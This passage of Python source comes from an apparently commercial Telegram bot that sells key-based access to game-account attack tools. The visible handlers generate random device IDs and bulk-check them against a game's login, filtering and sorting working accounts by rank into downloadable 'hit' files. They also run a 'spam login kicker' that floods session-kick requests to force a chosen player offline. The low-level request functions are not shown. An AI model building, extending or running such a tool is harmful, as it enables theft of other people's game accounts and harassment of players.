        return
    
    if data.startswith("canceljob_"):
        job_id = data.replace("canceljob_", "")
        job = get_bulk_job(job_id)
        if job and (job.get("user_id") == user_id or is_admin(user_id)):
            if cancel_bulk_job(job_id):
                await query.edit_message_text(
                    f"🛑 <b>Job {job_id} cancelled</b>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=main_menu_keyboard()
                )
            else:
                await query.answer("❌ Job not found or already completed!", show_alert=True)
        return
    
    if data == "bf_stop_all":
        active = []
        with bf_sessions_lock:
            for key, session in active_bf_sessions.items():
                if key.startswith(f"{user_id}_"):
                    active.append(key)
        
        for key in active:
            with bf_sessions_lock:
                if key in active_bf_sessions:
                    active_bf_sessions[key]["stop"] = True
                    active_bf_sessions[key]["refunded"] = True
            device = key.split('_', 1)[1] if '_' in key else ''
            if device and not is_admin(user_id):
                refund_user_bf_device(user_id, device)
        
        await query.edit_message_text(
            f"🛑 <b>Stopped {len(active)} session(s)</b>\n♻️ Usage refunded.",
            parse_mode=ParseMode.HTML,
            reply_markup=main_menu_keyboard()
        )
        return
    
    if data == "status_menu":
        # Show status menu
        active_jobs = get_user_active_jobs(user_id)
        if not active_jobs:
            await query.edit_message_text(
                "📊 <b>No active jobs</b>",
                parse_mode=ParseMode.HTML,
                reply_markup=main_menu_keyboard()
            )
            return
        
        text = "📊 <b>YOUR ACTIVE JOBS</b>\n═══════════════════════════\n"
        kb = []
        for job in active_jobs:
            progress = (job['processed'] / job['total'] * 100) if job['total'] > 0 else 0
            text += f"🆔 <code>{job['job_id']}</code>: {progress:.1f}%\n"
            kb.append([InlineKeyboardButton(
                f"📊 {job['job_id']}",
                callback_data=f"jobstatus_{job['job_id']}"
            )])
        kb.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
        
        await query.edit_message_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(kb)
        )
        return
    
    valid, _ = is_user_authorized(user_id)
    if not valid and not is_admin(user_id):
        await query.answer("🔒 Access required! Use /redeem KEY", show_alert=True)
        return
    
    if data == "main_menu":
        await show_main_menu(query, context)
    elif data == "gen_menu":
        await show_gen_menu(query, context)
    elif data == "single_menu":
        context.user_data["waiting_for_single_check"] = True
        context.user_data["waiting_for_bruteforce"] = False
        context.user_data.pop("admin_bf_action", None)
        await show_single_menu(query, context)
    elif data == "bulk_menu":
        context.user_data["waiting_for_single_check"] = False
        context.user_data["waiting_for_bruteforce"] = False
        context.user_data["waiting_for_bulk"] = True
        context.user_data.pop("admin_bf_action", None)
        await show_bulk_menu(query, context)
    elif data == "bf_menu":
        context.user_data["waiting_for_bruteforce"] = True
        context.user_data["waiting_for_single_check"] = False
        context.user_data.pop("admin_bf_action", None)
        await show_bf_menu(query, context)
    elif data == "stats":
        await show_stats(query, context)
    elif data == "files":
        await show_files(query, context)
    elif data == "profile":
        await show_profile(query, user_id, context)
    elif data == "help":
        await show_help(query, context)
    elif data == "admin":
        if is_admin(user_id):
            context.user_data["waiting_for_single_check"] = False
            context.user_data["waiting_for_bruteforce"] = False
            context.user_data["waiting_for_bulk"] = False
            context.user_data.pop("admin_bf_action", None)
            await show_admin_panel(query, context)
        else:
            await query.answer("🔒 Admin only!", show_alert=True)
    elif data.startswith("gen_start_"):
        await handle_gen_callback(query, data, context)
    elif data.startswith("bf_"):
        await handle_bf_callback(query, data, context)
    elif data.startswith("admin_"):
        if is_admin(user_id):
            await handle_admin_callback(query, data, context)
        else:
            await query.answer("🔒 Admin only!", show_alert=True)
    elif data.startswith("download_"):
        await handle_download(query, data, context)

# ────────────────────────────────────────────────────────────────
# 14. MENU DISPLAY FUNCTIONS
# ────────────────────────────────────────────────────────────────

async def show_main_menu(query, context):
    user_id = query.from_user.id
    username = query.from_user.username or query.from_user.first_name or "User"
    
    context.user_data["waiting_for_single_check"] = False
    context.user_data["waiting_for_bruteforce"] = False
    context.user_data["waiting_for_bulk"] = False
    context.user_data.pop("admin_bf_action", None)
    context.user_data.pop("admin_conv_state", None)
    context.user_data.pop("bf_custom_stage", None)
    
    if is_admin(user_id):
        text = (
            f"🤖 <b>PREMIUM DEVICE ID BOT V2.0</b>\n"
            f"═══════════════════════════\n"
            f"👋 <b>Admin Panel</b>\n"
            f"Choose an option below 👇"
        )
    else:
        expiry = get_user_expiry_info(user_id)
        used_count, limit = get_user_bf_usage_stats(user_id)
        active_jobs = get_user_active_jobs(user_id)
        jobs_text = f"\n⚙️ Active Jobs: {len(active_jobs)}" if active_jobs else ""
        text = (
            f"🤖 <b>PREMIUM DEVICE ID BOT V2.0</b>\n"
            f"═══════════════════════════\n"
            f"👋 Welcome, <b>{escape_html(username)}</b>!\n"
            f"{expiry}\n"
            f"⚡ BF: {used_count}/{limit}{jobs_text}\n"
            f"═══════════════════════════\n"
            f"Choose an option below 👇"
        )
    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())

async def show_gen_menu(query, context):
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📦 5 MB", callback_data="gen_start_5"),
         InlineKeyboardButton("📦 10 MB", callback_data="gen_start_10")],
        [InlineKeyboardButton("📦 25 MB", callback_data="gen_start_25"),
         InlineKeyboardButton("📦 50 MB", callback_data="gen_start_50")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ])
    text = (
        "🔨 <b>GENERATE DEVICE IDS</b>\n"
        "═══════════════════════════\n"
        "Select the size of device IDs to generate:\n\n"
        "💡 <b>1 MB ≈ 13,000 devices</b>\n"
        "💡 <b>10 MB ≈ 130,000 devices</b>\n"
        "💡 <b>50 MB ≈ 650,000 devices</b>"
    )
    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)

async def show_single_menu(query, context):
    text = (
        "🔍 <b>SINGLE ACCOUNT CHECK</b>\n"
        "═══════════════════════════\n"
        "Send me a <b>Device ID</b> to check.\n\n"
        "This will perform a full 8-request check:\n"
        "• Login verification\n"
        "• Ban status\n"
        "• Player info (nickname, level)\n"
        "• Rank (current & highest)\n"
        "• Heroes & skins count\n"
        "• V2L status\n"
        "• Account creation date\n\n"
        "💡 Usage: <code>/single and_xxxx...</code>\n"
        "Or just send the device ID directly.\n\n"
        "Type /cancel to abort."
    )
    await query.edit_message_text(text, parse_mode=ParseMode.HTML)

async def show_bulk_menu(query, context):
    text = (
        f"📂 <b>BULK CHECK (MAX {MAX_BULK_DEVICES:,})</b>\n"
        "═══════════════════════════\n"
        "📤 <b>Upload a .txt file</b> containing device IDs (one per line).\n\n"
        "🔍 The bot will:\n"
        "• Check each device with 8 requests\n"
        "• Sort accounts by rank\n"
        "• Detect V2L status\n"
        "• Filter banned accounts\n"
        "• Auto-upload result files when complete\n"
        f"• Max {MAX_BULK_DEVICES:,} devices per file\n\n"
        "💡 Use /status to check job progress\n"
        "Type /cancel to abort."
    )
    await query.edit_message_text(text, parse_mode=ParseMode.HTML)

async def show_bf_menu(query, context):
    user_id = query.from_user.id
    used_count, limit = get_user_bf_usage_stats(user_id)
    remaining = limit - used_count if limit > 0 else "Unlimited"
    
    if limit > 0:
        limit_text = f"🔢 Used: {used_count}/{limit} devices\n📊 Remaining: {remaining}"
    else:
        limit_text = "♾️ Unlimited (Admin override)"
    
    text = (
        f"⚡ <b>BRUTE FORCE / SPAM LOGIN KICKER</b>\n"
        f"═══════════════════════════\n"
        f"{limit_text}\n"
        f"═══════════════════════════\n"
        f"Send me a <b>Device ID</b> to target.\n\n"
        f"Usage: <code>/bruteforce and_xxxx...</code>\n"
        f"Or just send the device ID directly.\n\n"
        f"Type /cancel to abort."
    )
    await query.edit_message_text(text, parse_mode=ParseMode.HTML)

# ────────────────────────────────────────────────────────────────
# 15. STATS / FILES / PROFILE / HELP
# ────────────────────────────────────────────────────────────────

async def show_stats(query, context):
    with COUNTER_LOCK:
        lines = ["📊 <b>STATISTICS</b>", "═══════════════════════════", "<b>Rank Distribution:</b>"]
        rank_emojis = {'warrior': '🥉', 'elite': '🥈', 'master': '🥇', 'gm': '⭐', 'epic': '💜', 'legend': '💠', 'mythic': '🔥'}
        for rank in ['warrior', 'elite', 'master', 'gm', 'epic', 'legend', 'mythic']:
            count = HIT_COUNTERS.get(rank, 0)
            emoji = rank_emojis.get(rank, '•')
            lines.append(f"  {emoji} {rank.capitalize():<12}: {count:,}")
        
        lines.append(f"\n<b>V2L Status:</b>")
        lines.append(f"  🟢 Active: {HIT_COUNTERS.get('v2l_active', 0):,}")
        lines.append(f"  🔴 Inactive: {HIT_COUNTERS.get('v2l_inactive', 0):,}")
        lines.append(f"\n<b>Special:</b>")
        lines.append(f"  👑 Sultan: {HIT_COUNTERS.get('sultan', 0):,}")
        lines.append(f"  🚫 Banned: {HIT_COUNTERS.get('banned', 0):,}")
        
        total = sum(HIT_COUNTERS.get(r, 0) for r in ['warrior', 'elite', 'master', 'gm', 'epic', 'legend', 'mythic'])
        if total > 0:
            lines.append(f"\n✅ <b>Total Good Accounts:</b> {total:,}")
        lines.append("═══════════════════════════")
    
    await query.edit_message_text("\n".join(lines), parse_mode=ParseMode.HTML, reply_markup=back_keyboard())

async def show_files(query, context):
    file_buttons = []
    for name, path in FILES.items():
        if os.path.exists(path) and os.path.getsize(path) > 0:
            size = os.path.getsize(path)
            size_str = f"{size/1024:.1f} KB" if size < 1024*1024 else f"{size/(1024*1024):.2f} MB"
            file_buttons.append([InlineKeyboardButton(f"📄 {name} ({size_str})", callback_data=f"download_{name}")])
    
    for rank_name in ['warrior', 'elite', 'master', 'gm', 'epic', 'legend', 'mythic']:
        rank_file = get_rank_file(rank_name)
        if rank_file and os.path.exists(rank_file) and os.path.getsize(rank_file) > 0:
            size = os.path.getsize(rank_file)
            size_str = f"{size/1024:.1f} KB" if size < 1024*1024 else f"{size/(1024*1024):.2f} MB"
            file_buttons.append([InlineKeyboardButton(f"🏆 {rank_name}_hits ({size_str})", callback_data=f"download_rank_{rank_name}")])
    
    for v2l_type in ['v2l_active', 'v2l_inactive']:
        v2l_file = os.path.join(OUTPUT_DIR, FOLDERS[v2l_type], f"{v2l_type}.txt")
        if os.path.exists(v2l_file) and os.path.getsize(v2l_file) > 0:
            size = os.path.getsize(v2l_file)
            size_str = f"{size/1024:.1f} KB" if size < 1024*1024 else f"{size/(1024*1024):.2f} MB"
            file_buttons.append([InlineKeyboardButton(f"🔐 {v2l_type} ({size_str})", callback_data=f"download_{v2l_type}")])
    
    sultan_file = os.path.join(OUTPUT_DIR, FOLDERS["sultan"], "sultan.txt")
    if os.path.exists(sultan_file) and os.path.getsize(sultan_file) > 0:
        size = os.path.getsize(sultan_file)
        size_str = f"{size/1024:.1f} KB" if size < 1024*1024 else f"{size/(1024*1024):.2f} MB"
        file_buttons.append([InlineKeyboardButton(f"👑 sultan ({size_str})", callback_data=f"download_sultan")])
    
    file_buttons.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
    
    if len(file_buttons) <= 1:
        text = "📁 <b>My Files</b>\n═══════════════════════════\n\nNo files available yet.\nGenerate or check devices first!"
    else:
        text = "📁 <b>My Files</b>\n═══════════════════════════\n\nSelect a file to download:"
    
    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(file_buttons))

async def handle_download(query, data, context):
    file_key = data.replace("download_", "")
    
    if file_key.startswith("rank_"):
        rank_name = file_key.replace("rank_", "")
        file_path = get_rank_file(rank_name)
    else:
        file_path = FILES.get(file_key)
        if not file_path:
            special = {
                "v2l_active": os.path.join(OUTPUT_DIR, FOLDERS["v2l_active"], "v2l_active.txt"),
                "v2l_inactive": os.path.join(OUTPUT_DIR, FOLDERS["v2l_inactive"], "v2l_inactive.txt"),
                "sultan": os.path.join(OUTPUT_DIR, FOLDERS["sultan"], "sultan.txt"),
            }
            file_path = special.get(file_key)
    
    if not file_path or not os.path.exists(file_path):
        await query.answer("❌ File not found!", show_alert=True)
        return
    
    with open(file_path, 'rb') as f:
        await context.bot.send_document(
            chat_id=query.message.chat_id,
            document=InputFile(f, filename=os.path.basename(file_path)),
            caption=f"📄 {os.path.basename(file_path)}"
        )
    await query.answer("✅ File sent!")

async def show_profile(query, user_id, context):
    if is_admin(user_id):
        text = (
            f"👤 <b>MY PROFILE</b>\n"
            f"═══════════════════════════\n"
            f"🆔 User ID: <code>{user_id}</code>\n"
            f"👤 Name: {escape_html(query.from_user.username or query.from_user.first_name)}\n"
            f"👑 Role: <b>Admin</b>\n"
            f"♾️ Access: <b>Lifetime</b>\n"
            f"═══════════════════════════\n"
            f"✨ Created by: @ZyronDevv"
        )
    else:
        expiry = get_user_expiry_info(user_id)
        used_count, limit = get_user_bf_usage_stats(user_id)
        active_jobs = get_user_active_jobs(user_id)
        
        text = (
            f"👤 <b>MY PROFILE</b>\n"
            f"═══════════════════════════\n"
            f"🆔 User ID: <code>{user_id}</code>\n"
            f"👤 Name: {escape_html(query.from_user.username or query.from_user.first_name)}\n"
            f"═══════════════════════════\n"
            f"📋 <b>Access Info:</b>\n{expiry}\n"
            f"═══════════════════════════\n"
            f"⚡ <b>Brute Force Usage:</b>\n"
            f"  📊 Used: {used_count}/{limit}\n"
            f"  💡 Each device can only be used once\n"
            f"  ♻️ Usage is refunded if you cancel/stop\n"
        )
        
        if active_jobs:
            text += f"═══════════════════════════\n📊 <b>Active Bulk Jobs:</b> {len(active_jobs)}\n"
            for job in active_jobs:
                progress = (job['processed'] / job['total'] * 100) if job['total'] > 0 else 0
                text += f"  🆔 {job['job_id']}: {progress:.1f}%\n"
        
        text += "═══════════════════════════\n✨ Created by: @ZyronDevv"
    
    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=back_keyboard())

async def show_help(query, context):
    text = (
        "ℹ️ <b>HELP & COMMANDS</b>\n"
        "═══════════════════════════\n\n"
        "<b>Available Commands:</b>\n"
        "• /start - Show this message\n"
        "• /help - Show help\n"
        "• /about - About this bot\n"
        "• /single - Check a single device ID\n"
        "• /bulk - Upload file for bulk check\n"
        "• /status - Check bulk job status\n"
        "• /cancel - Cancel a running bulk job\n"
        "• /redeem - Redeem subscription key\n"
        "• /mykey - Check subscription status\n"
        "• /bruteforce - Brute force / spam login kicker\n"
        "• /bfstop - Stop a running brute force\n"
        "• /bfstatus - Show current brute force status\n\n"
        "<b>Device ID Format:</b>\n"
        "<code>and_a1b2c3d4e5f6...</code>\n\n"
        "<b>Features:</b>\n"
        "🔨 <b>Generate Devices</b> - Create random device IDs\n"
        "🔍 <b>Single Check</b> - Check one device\n"
        "📂 <b>Bulk Check</b> - Upload .txt file (max 100K)\n"
        "⚡ <b>Brute Force</b> - Spam login kicker\n"
        "📊 <b>Statistics</b> - View hit counters\n"
        "👤 <b>My Profile</b> - View your access info\n\n"
        "═══════════════════════════\n"
        "✨ Created by: @ZyronDevv"
    )
    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=back_keyboard())

# ────────────────────────────────────────────────────────────────
# 16. GENERATOR HANDLER
# ────────────────────────────────────────────────────────────────

async def handle_gen_callback(query, data, context):
    if data.startswith("gen_start_"):
        size = float(data.split("_")[-1])
        await query.edit_message_text(
            f"⏳ <b>Generating {size} MB of device IDs...</b>\n"
            f"Using 16 threads. Please wait...",
            parse_mode=ParseMode.HTML
        )
        
        result = [None]
        def worker():
            result[0] = run_generator(size, 16)
        
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        
        while t.is_alive():
            await asyncio.sleep(1)
        
        target_lines, output_file = result[0]
        file_size = os.path.getsize(output_file) / (1024*1024)
        
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("📥 Download File", callback_data="download_generated_devices")],
            [InlineKeyboardButton("🔙 Back", callback_data="gen_menu")]
        ])
        await query.edit_message_text(
            f"✅ <b>Generation Complete!</b>\n"
            f"═══════════════════════════\n"
            f"📦 Size: {file_size:.2f} MB\n"
            f"📊 Devices: {target_lines:,}\n"
            f"📁 File: generated_devices.txt",
            parse_mode=ParseMode.HTML, reply_markup=kb
        )

# ────────────────────────────────────────────────────────────────
# 17. BRUTE FORCE CALLBACK HANDLER
# ────────────────────────────────────────────────────────────────

async def handle_bf_callback(query, data, context):
    user_id = query.from_user.id
    
    if data == "bf_stop":
        device_id = context.user_data.get('bf_device', '')
        session_key = f"{user_id}_{device_id}"
        with bf_sessions_lock:
            if session_key in active_bf_sessions:
                active_bf_sessions[session_key]["stop"] = True
                active_bf_sessions[session_key]["refunded"] = True
        
        context.user_data["bf_stop_flag"] = True
        context.user_data["bf_refunded"] = True
        
        refund_msg = ""
        if device_id and not is_admin(user_id):
            if refund_user_bf_device(user_id, device_id):
                refund_msg = "\n♻️ <b>Usage refunded (+1 remaining)</b>"
        
        await query.edit_message_text(
            f"🛑 <b>Stopping kick... Please wait.</b>{refund_msg}",
            parse_mode=ParseMode.HTML
        )
        return
    
    if data.startswith("bf_kick_"):
        device_id = context.user_data.get("bf_device")
        if not device_id:
            await query.edit_message_text("❌ Session expired. Please restart.")
            return
        
        user_devices = get_user_bf_devices(user_id)
        limit = get_bf_limit(user_id)
        
        if not is_admin(user_id):
            if limit > 0 and len(user_devices) >= limit and device_id not in user_devices:
                await query.edit_message_text(
                    f"❌ <b>Device Limit Reached!</b>\n\n"
                    f"You have reached the limit of <b>{limit}</b> device(s).\n"
                    f"📊 Used: {len(user_devices)}/{limit}\n"
                    f"💡 Contact admin to increase your limit.",
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_keyboard()
                )
                return
            
            if device_id in user_devices:
                await query.edit_message_text(
                    f"❌ <b>Device Already Used!</b>\n\n"
                    f"Each device can only be used once.\n"
                    f"📊 Used: {len(user_devices)}/{limit}",
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_keyboard()
                )
                return
        
        if "custom" in data:
            context.user_data["bf_custom_stage"] = "loops"
            context.user_data["waiting_for_bruteforce"] = False
            await query.edit_message_text(
                "🛠️ <b>Custom Kick Settings</b>\n\n"
                "Send number of loops (0 = unlimited):\n\n"
                "Type /cancel to abort.",
                parse_mode=ParseMode.HTML
            )
            return
        
        parts = data.split("_")
        loops = int(parts[2])
        delay = float(parts[3]) if len(parts) > 3 else 0.0
        
        context.user_data["bf_stop_flag"] = False
        context.user_data["bf_refunded"] = False
        asyncio.create_task(run_spam_kick(query, context, device_id, loops, delay, user_id))

# ────────────────────────────────────────────────────────────────
# 18. SPAM KICK RUNNER
# ────────────────────────────────────────────────────────────────

async def run_spam_kick(query, context, device_id, total_loops, delay_sec, user_id):
    session_key = f"{user_id}_{device_id}"
    
    with bf_sessions_lock:
        active_bf_sessions[session_key] = {"stop": False, "running": True, "refunded": False}
    
    profile = fetch_session_profile(device_id)
    
    if not profile:
        with bf_sessions_lock:
            if session_key in active_bf_sessions:
                del active_bf_sessions[session_key]
        await query.edit_message_text(
            "❌ <b>Invalid Device ID!</b>\n"
            "Device may be dead or login failed.",
            parse_mode=ParseMode.HTML,
            reply_markup=back_keyboard()
        )
        return
    
    if not is_admin(user_id):
        add_user_bf_device(user_id, device_id)
    
    context.user_data["bf_refunded"] = False
    
    loop_label = f"{total_loops:,} Loops" if total_loops > 0 else "♾️ Unlimited"
    
    status_msg = await query.edit_message_text(
        f"⚡ <b>SPAM KICKER ACTIVE</b>\n"
        f"═══════════════════════════\n"
        f"👤 Target: <b>{escape_html(profile['nickname'])}</b>\n"
        f"🆔 ID: <code>{profile['account_id']}</code>\n"
        f"🏆 Rank: {profile['rank']}\n"
        f"🔄 Mode: {loop_label}\n"
        f"⏱️ Delay: {delay_sec}s\n"
        f"═══════════════════════════\n"
        f"⏳ Running... Press 'Stop Current Kick' to stop.",
        parse_mode=ParseMode.HTML
    )
    
    results = {"count": 0, "success": 0, "fail": 0, "latencies": [], "running": True, "duration": 0}
    
    def do_kicks():
        count = 0
        success_count = 0
        fail_count = 0
        latencies = []
        start_time = time.time()
        
        try:
            while results["running"]:
                with bf_sessions_lock:
                    if session_key in active_bf_sessions and active_bf_sessions[session_key].get("stop", False):
                        results["running"] = False
                        break
                
                if context and context.user_data.get("bf_stop_flag", False):
                    results["running"] = False
                    break
                    
                count += 1
                ok, lat, desc = send_session_kick(profile)
                latencies.append(lat)
                if ok:
                    success_count += 1
                else:
                    fail_count += 1
                if total_loops > 0 and count >= total_loops:
                    break
                if delay_sec > 0:
                    time.sleep(delay_sec)
        except Exception:
            pass
        
        duration = time.time() - start_time
        results["count"] = count
        results["success"] = success_count
        results["fail"] = fail_count
        results["latencies"] = latencies
        results["duration"] = duration
        results["running"] = False
        
        with bf_sessions_lock:
            if session_key in active_bf_sessions:
                del active_bf_sessions[session_key]
    
    kick_thread = threading.Thread(target=do_kicks, daemon=True)
    kick_thread.start()
    
    last_update = time.time()
    while results["running"] or kick_thread.is_alive():
        await asyncio.sleep(1)
        if time.time() - last_update > 5:
            count = results.get("count", 0)
            success = results.get("success", 0)
            if count > 0:
                try:
                    await status_msg.edit_text(
                        f"⚡ <b>SPAM KICKER ACTIVE</b>\n"
                        f"═══════════════════════════\n"
                        f"👤 Target: <b>{escape_html(profile['nickname'])}</b>\n"
                        f"🔄 Attempts: {count:,}\n"
                        f"✅ Success: {success:,}\n"
                        f"❌ Failed: {results.get('fail', 0):,}\n"
                        f"⏱️ Delay: {delay_sec}s\n"
                        f"═══════════════════════════\n"
                        f"⏳ Still running...",
                        parse_mode=ParseMode.HTML
                    )
                except Exception:
                    pass
            last_update = time.time()
    
    kick_thread.join(timeout=2)
    
    count = results["count"]
    success_count = results["success"]
    fail_count = results["fail"]
    latencies = results["latencies"]
    duration = results.get("duration", 0)
    
    avg_lat = (sum(latencies) / len(latencies)) if latencies else 0.0
    succ_pct = (success_count / count * 100) if count > 0 else 0.0
    speed = (count / duration) if duration > 0 else 0.0
    
    was_stopped = context.user_data.get("bf_stop_flag", False) or context.user_data.get("bf_refunded", False)
    context.user_data["bf_stop_flag"] = False
    
    refund_note = ""
    if not is_admin(user_id):
        if was_stopped or context.user_data.get("bf_refunded", False):
            if refund_user_bf_device(user_id, device_id):
                refund_note = "\n♻️ <b>Usage refunded (+1 remaining)</b>"
    
    context.user_data["bf_refunded"] = False
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔁 Kick Again", callback_data="bf_menu")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]
    ])
    
    status_text = "🛑 <b>STOPPED BY USER</b>\n" if was_stopped else "📊 <b>SPAM KICK SUMMARY</b>\n"
    
    try:
        await status_msg.edit_text(
            f"{status_text}"
            f"═══════════════════════════\n"
            f"👤 Target: <b>{escape_html(profile['nickname'])}</b>\n"
            f"⏱️ Duration: {duration/60:.1f} min ({duration:.1f}s)\n"
            f"🔄 Total Attempts: {count:,}\n"
            f"✅ Success Kicks: {success_count:,} ({succ_pct:.1f}%)\n"
            f"❌ Failed Kicks: {fail_count:,}\n"
            f"⚡ Avg Latency: {avg_lat:.1f} ms\n"
            f"🚀 Speed: {speed:.2f} kick/s\n"
            f"═══════════════════════════"
            f"{refund_note}\n"
            f"✨ Created by: @ZyronDevv",
            parse_mode=ParseMode.HTML, reply_markup=kb
        )
    except Exception:
        pass

# ────────────────────────────────────────────────────────────────
# 19. ADMIN PANEL
# ────────────────────────────────────────────────────────────────

async def show_admin_panel(query, context):
    keys = list_all_keys()
    users = list_all_users()
    active_keys = sum(1 for k in keys if k["status"] == "active")
    active_users = sum(1 for u in users if u.get("status") == "active")
    bf_limit = get_bf_limit()
    
    text = (
        f"🛠️ <b>ADMIN PANEL</b>\n"
        f"═══════════════════════════\n"
        f"🔑 Total Keys: {len(keys)}\n"
        f"✅ Active Keys: {active_keys}\n"
        f"👥 Total Users: {len(users)}\n"
        f"🟢 Active Users: {active_users}\n"
        f"⚡ BF Global Limit: {bf_limit}\n"
        f"═══════════════════════════\n"
        f"Choose an option below 👇"
    )
    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())

async def handle_admin_callback(query, data, context):
    user_id = query.from_user.id
    
    if data == "admin_genkey":
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("📅 1 Day", callback_data="admin_mk_1_1"),
             InlineKeyboardButton("📅 7 Days", callback_data="admin_mk_7_1"),
             InlineKeyboardButton("📅 30 Days", callback_data="admin_mk_30_1")],
            [InlineKeyboardButton("♾️ Lifetime", callback_data="admin_mk_0_1"),
             InlineKeyboardButton("📅 7d (5 uses)", callback_data="admin_mk_7_5"),
             InlineKeyboardButton("📅 30d (10 uses)", callback_data="admin_mk_30_10")],
            [InlineKeyboardButton("🔙 Back", callback_data="admin")]
        ])
        await query.edit_message_text(
            "🔑 <b>GENERATE KEY</b>\n"
            "═══════════════════════════\n"
            "Select key duration & uses:",
            parse_mode=ParseMode.HTML, reply_markup=kb
        )
    
    elif data.startswith("admin_mk_"):
        parts = data.split("_")
        days = int(parts[2])
        uses = int(parts[3])
        admin_name = query.from_user.username or str(user_id)
        key_data = create_key(days, uses, admin_name)
        
        dur_text = "Lifetime" if days == 0 else f"{days} days"
        await query.edit_message_text(
            f"✅ <b>KEY CREATED!</b>\n"
            f"═══════════════════════════\n"
            f"🔑 Key: <code>{key_data['key']}</code>\n"
            f"📅 Duration: {dur_text}\n"
            f"🔄 Max Uses: {uses}\n"
            f"═══════════════════════════\n"
            f"They can use: /redeem {key_data['key']}",
            parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard()
        )
    
    elif data == "admin_listkeys":
        keys = list_all_keys()
        if not keys:
            await query.edit_message_text("📋 No keys found.", parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
            return
        
        lines = ["📋 <b>ALL KEYS</b>", "═══════════════════════════"]
        for k in keys[-20:]:
            dur = "Lifetime" if k["duration_days"] == 0 else f"{k['duration_days']}d"
            status_emoji = "✅" if k["status"] == "active" else "❌" if k["status"] in ("used", "expired") else "🚫"
            lines.append(f"{status_emoji} <code>{k['key']}</code>")
            lines.append(f"   Dur: {dur} | Uses: {k['uses']}/{k['max_uses']} | Status: {k['status']}")
            if k.get("activated_by"):
                for u in k["activated_by"]:
                    lines.append(f"   └ {u['username']} ({u['user_id']})")
            lines.append("")
        
        if len(keys) > 20:
            lines.append(f"... and {len(keys)-20} more keys")
        lines.append("═══════════════════════════")
        
        await query.edit_message_text("\n".join(lines), parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
    
    elif data == "admin_listusers":
        users = list_all_users()
        if not users:
            await query.edit_message_text("👥 No users found.", parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
            return
        
        lines = ["👥 <b>ALL USERS</b>", "═══════════════════════════"]
        for u in users[-30:]:
            status_emoji = "🟢" if u.get("status") == "active" else "🔴"
            lines.append(f"{status_emoji} <b>{escape_html(u.get('username', 'N/A'))}</b>")
            lines.append(f"   ID: <code>{u['user_id']}</code> | Key: <code>{u.get('key', 'N/A')}</code>")
            if u.get("expires_at"):
                lines.append(f"   Expires: {u['expires_at'][:19]}")
            else:
                lines.append(f"   Expires: ♾️ Lifetime")
            lines.append("")
        
        if len(users) > 30:
            lines.append(f"... and {len(users)-30} more users")
        lines.append("═══════════════════════════")
        
        await query.edit_message_text("\n".join(lines), parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
    
    elif data == "admin_delkey":
        context.user_data["admin_conv_state"] = "delete_key"
        await query.edit_message_text(
            "🗑️ <b>DELETE KEY</b>\n\n"
            "Send the key code to delete:\n\n"
            "Type /cancel to abort.",
            parse_mode=ParseMode.HTML
        )
    
    elif data == "admin_revoke":
        context.user_data["admin_conv_state"] = "revoke_user"
        await query.edit_message_text(
            "🚫 <b>REVOKE USER ACCESS</b>\n\n"
            "Send the User ID to revoke:\n\n"
            "Type /cancel to abort.",
            parse_mode=ParseMode.HTML
        )
    
    elif data == "admin_broadcast":
        context.user_data["admin_conv_state"] = "broadcast"
        await query.edit_message_text(
            "📢 <b>BROADCAST MESSAGE</b>\n\n"
            "Send the message to broadcast to all users:\n\n"
            "Type /cancel to abort.",
            parse_mode=ParseMode.HTML
        )
    
    elif data == "admin_adduser":
        context.user_data["admin_conv_state"] = "add_user"
        await query.edit_message_text(
            "➕ <b>ADD USER (MANUAL)</b>\n\n"
            "Send the User ID to add (with lifetime access):\n\n"
            "Type /cancel to abort.",
            parse_mode=ParseMode.HTML
        )
    
    elif data == "admin_botstats":
        with COUNTER_LOCK:
            total_hits = sum(HIT_COUNTERS.values())
        keys_count = len(list_all_keys())
        users_count = len(list_all_users())
        bf_limit = get_bf_limit()
        
        text = (
            f"📊 <b>BOT STATISTICS</b>\n"
            f"═══════════════════════════\n"
            f"🔑 Total Keys: {keys_count}\n"
            f"👥 Total Users: {users_count}\n"
            f"📊 Total Hits: {total_hits:,}\n"
            f"🔥 Mythic: {HIT_COUNTERS.get('mythic', 0):,}\n"
            f"💠 Legend: {HIT_COUNTERS.get('legend', 0):,}\n"
            f"👑 Sultan: {HIT_COUNTERS.get('sultan', 0):,}\n"
            f"🚫 Banned: {HIT_COUNTERS.get('banned', 0):,}\n"
            f"⚡ BF Global Limit: {bf_limit}\n"
            f"═══════════════════════════"
        )
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
    
    elif data == "admin_bf_limits":
        global_limit = get_bf_limit()
        with BF_LIMITS_LOCK:
            limits = load_json(BF_LIMITS_FILE)
            user_overrides = limits.get("user_overrides", {})
            custom_count = len(user_overrides)
        
        await query.edit_message_text(
            "⚡ <b>BRUTE FORCE LIMITS ADMIN</b>\n"
            "═══════════════════════════\n"
            f"🌍 Global limit: <b>{global_limit}</b> device(s) per user\n"
            f"👤 Users with custom limits: <b>{custom_count}</b>\n\n"
            "Select an option below:",
            parse_mode=ParseMode.HTML,
            reply_markup=bf_limits_admin_keyboard()
        )
    
